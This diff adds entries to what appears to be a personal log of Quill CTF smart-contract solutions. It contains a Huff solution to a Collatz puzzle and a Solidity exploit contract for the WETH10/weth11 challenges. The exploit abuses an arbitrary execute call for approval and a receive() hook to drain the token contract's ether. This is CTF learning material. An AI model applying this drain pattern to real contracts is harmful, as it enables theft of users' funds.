@@ -913,5 +913,70 @@ contract D31eg4t3Exploit {
 }
 ```
 
+### 2024.09.12
+
+- Quill CTF: Collatz Puzzle
+https://github.com/devtooligan/collatzPuzzle/blob/main/test/CollatzPuzzle.sol
+
+```huff
+#define macro MAIN() = takes (0) returns (0) {
+  0x04 calldataload    // Load the input value 'n' from calldata at offset 0x04
+  0x02                 // Push the constant 2 onto the stack
+  dup2                 // Duplicate 'n' on the stack
+  mod                  // Calculate n % 2 to check if 'n' is even or odd
+  iszero               // Check if (n % 2) == 0
+  handleEvenCase jumpi // If 'n' is even, jump to the 'handleEvenCase' label
+  0x03                 // Push the constant 3 onto the stack
+  mul                  // Calculate 3 * n
+  0x1                  // Push the constant 1 onto the stack
+  add                  // Calculate (3 * n) + 1
+  returnResult jump    // Jump to the 'returnResult' label to return the result
+  
+  handleEvenCase:
+  0x01                 // Push the constant 1 onto the stack 
+  shr                  // Calculate n >> 1 (equivalent to n / 2)
+ 
+ returnResult:
+  returndatasize mstore // Store the result in memory
+  calldatasize returndatasize return // Return the result
+    
+}
+```
+
+### 2024.09.13
+
+- Quill CTF: Weth10
+- Quill CTF: weth11
+
+```solidity
+contract WETH10Exploit{
+
+    function exploit(address payable weth10) public payable {
+        WETH10(weth10).execute(weth10, 0, abi.encodeWithSelector(ERC20.approve.selector, address(this), type(uint256).max));
+
+        for (uint i; i < 20; ++i) {
+            WETH10(weth10).deposit{value: 0.5 ether}();
+            WETH10(weth10).withdrawAll();
+        }
+
+        WETH10(weth10).transferFrom(weth10, address(this), WETH10(weth10).balanceOf(weth10));
+        WETH10(weth10).withdrawAll();
+
+        payable(msg.sender).transfer(address(this).balance);
+
+    }
+
+    receive() external payable {
+        WETH10(payable(msg.sender)).transfer(msg.sender, WETH10(payable(msg.sender)).balanceOf(address(this)));
+    }
+
+}
+```
+
+```solidity
+        weth.execute(address(weth), 0, abi.encodeWithSelector(ERC20.approve.selector, address(bob), type(uint256).max));
+        weth.transferFrom(address(weth), address(bob), weth.balanceOf(address(weth)));
+        weth.withdrawAll();
+```
 
 <!-- Content_END -->
